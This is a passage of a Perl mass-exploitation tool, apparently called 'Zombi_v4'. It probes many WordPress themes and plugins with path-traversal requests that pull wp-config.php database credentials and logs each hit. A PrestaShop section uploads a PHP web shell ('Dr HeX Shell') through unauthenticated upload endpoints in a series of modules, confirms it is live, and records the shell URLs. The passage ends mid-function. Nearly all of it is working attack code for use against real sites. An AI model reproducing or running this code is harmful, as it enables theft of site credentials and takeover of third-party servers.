my $exploitblog = "$site/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
	sub RedSteel(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"RedSteel ++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False ";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
	sub Revsliderss(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Revslider +++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	
	sub S3bubble(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"S3bubble-amazon-s3-html-5 +++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	sub SMWF(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"SMWF ++++++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	sub TheLoft(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"TheLoft +++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False ";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	sub Trinity(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Trinity +++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False ";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	
####################################################################################################
	
	sub Urbancity(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Urbancity +++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False ";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
	sub Yakimabait(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
  print color('bold white'),"Yakimabait ++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/yakimabait/download.php?file=./wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	
	
	sub Membership(){          print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
  print color('bold white'),"Membership Simplified v1.58 +++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=+++/./+++/./+++/./wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
		sub FileManagerwp(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Wp-FileManager ++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
			sub Googlemp3(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Google-mp3-audio-player +++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
				sub Justifiedim(){           print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
  print color('bold white'),"Justified-image-grid 1 ++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
				sub Justified2(){           print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Justified-image-grid 2 ++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
				sub Justified3(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Justified-image-grid 3 ++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
				sub Aspose(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Aspose-cloud-ebook-generator ++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	

	####################################################################################################

	
	
					sub Asposedoc(){           print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
  print color('bold white'),"Aspose-doc-exporter +++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
						sub MiwoFTP(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"MiwoFTP 1.0.5  1 ++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&item=wp-config.php&order=name&srt=yes";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
						sub MiwoFTP2(){          print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"MiwoFTP 1.0.5  2 ++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	
	
							sub miniaudioplayer(){          print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Wp-miniaudioplayer ++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
								sub Ypotheme(){           print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
   print color('bold white'),"Ypo-theme +++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/ypo-theme/download.php?download=..%2F..%2F..%2F..%2Fwp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
	
									sub Media14(){           print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"N-Media 1.4 +++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/website-contact-form-with-file-upload/config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	####################################################################################################

										sub wpmon(){  print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Wp-mon ++++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-mon/assets/download.php?type=octet/stream&path=../../../../&name=wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
											sub mapprolbs(){ print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Ibs-mappro ++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "Success";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}


####################################################################################################

######################################################
#################### PrestaShoP ######################
######################################################

################ columnadverts #####################
sub hexking($site){
print"[HeX.............] $site";
@path = ('hex.php',);
 
foreach $myshell(@path){
 
$shellzhex = $site.''.$myshell;
$req = HTTP::Request->new(GET=>$shellzhex);
$useragent = LWP::UserAgent->new();
 
$response = $useragent->request($req);
 
if ($response->is_success){
print color('bold green');
print "Payload Success: $shellzhex\n";
 open(save, '>>Zombi_v4/v4_12_05_2018_shell.txt');
    print save "$shellzhex\n";
	    close(save);

}else{
print color('bold red');
print "Failed: $shellzhex\n";
}
}
		}


################ soopamobile #####################
sub soopamobile(){
my $url = "$site/modules/soopamobile/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);

$soopamobileup="$site/modules/soopamobile/slides/v4.php";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"soopamobile";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $soopamobileup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
}else{
print color('bold white'),"soopamobile";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ soopabanners #####################
sub soopabanners(){
my $url = "$site/modules/soopabanners/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);
$soopabannersup="$site/modules/soopabanners/slides/v4.php";
my $checksoopabanners = $ua->get("$soopabannersup")->content;
if($checksoopabanners =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"soopabanners";
print color('bold white')," ++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $soopabannersup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$soopabannersup\n";
close (TEXT);
}else{
print color('bold white'),"soopabanners";
print color('bold white')," ++++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ vtermslideshow #####################
sub vtermslideshow(){
my $url = "$site/modules/vtermslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);

$vtermslideshowup="$site/modules/vtermslideshow/slides/v4.php";

my $checkvtermslideshow = $ua->get("$vtermslideshowup")->content;
if($checkvtermslideshow =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"Vtermslideshow";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $vtermslideshowup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$vtermslideshowup\n";
close (TEXT);
}else{
print color('bold white'),"Vtermslideshow";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ simpleslideshow #####################
sub simpleslideshow(){
my $url = "$site/modules/simpleslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);

$simpleslideshowup="$site/modules/simpleslideshow/slides/v4.php";

my $checksimpleslideshow = $ua->get("$simpleslideshowup")->content;
if($checksimpleslideshow =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"simpleslideshow";
print color('bold white')," +++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $simpleslideshowup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$simpleslideshowup\n";
close (TEXT);
}else{
print color('bold white'),"simpleslideshow";
print color('bold white')," +++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ productpageadverts #####################
sub productpageadverts(){
my $url = "$site/modules/productpageadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);

$productpageadvertsup="$site/modules/productpageadverts/slides/v4.php";

my $checkproductpageadverts = $ua->get("$productpageadvertsup")->content;
if($checkproductpageadverts =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"productpageadverts";
print color('bold white')," ++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $productpageadvertsup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$productpageadvertsup\n";
close (TEXT);
}else{
print color('bold white'),"productpageadverts";
print color('bold white')," ++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ homepageadvertise #####################
sub homepageadvertise(){
my $url = "$site/modules/homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);
$homepageadvertiseup="$site/modules/homepageadvertise/slides/v4.php";

my $checkhomepageadvertise = $ua->get("$homepageadvertiseup")->content;
if($checkhomepageadvertise =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"homepageadvertise";
print color('bold white')," +++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $homepageadvertiseup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold white'),"homepageadvertise";
print color('bold white')," +++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ homepageadvertise2 #####################
sub homepageadvertise2(){
my $url = "$site/modules/homepageadvertise2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);

$homepageadvertise2up="$site/modules/homepageadvertise2/slides/v4.php";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"homepageadvertise2";
print color('bold white')," ++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $homepageadvertise2up\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$homepageadvertise2up\n";
close (TEXT);
}else{
print color('bold white'),"homepageadvertise2";
print color('bold white')," ++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ jro_homepageadvertise #####################
sub jro_homepageadvertise(){
my $url = "$site/modules/jro_homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);

$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/v4.php";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"jro_homepageadvertise";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold white'),"jro_homepageadvertise";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}

################ attributewizardpro #####################
sub attributewizardpro(){
my $url = "$site/modules/attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);

$attributewizardproup="$site/modules/attributewizardpro/file_uploads/v4.php";

my $checkattributewizardpro = $ua->get("$attributewizardproup")->content;
if($checkattributewizardpro =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"attributewizardpro";
print color('bold white')," ++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $attributewizardproup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$attributewizardproup\n";
close (TEXT);
}else{
print color('bold white'),"attributewizardpro";
print color('bold white')," ++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ 1attributewizardpro #####################
sub oneattributewizardpro(){
my $url = "$site/modules/1attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["v4.php"],]);

$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/v4.php";

my $checkoneattributewizardpro = $ua->get("$oneattributewizardproup")->content;
if($checkoneattributewizardpro =~/Dr HeX Shell/) {
print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";

print color('bold white'),"1attributewizardpro";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $oneattributewizardproup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$oneattributewizardproup\n";
close (TEXT);
}else{
print color('bold white'),"1attributewizardpro";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}

################ attributewizardpro.OLD #####################
sub attributewizardproOLD(){
my $url = "$site/modules/attributewizardpro.OLD/file_upload.php";
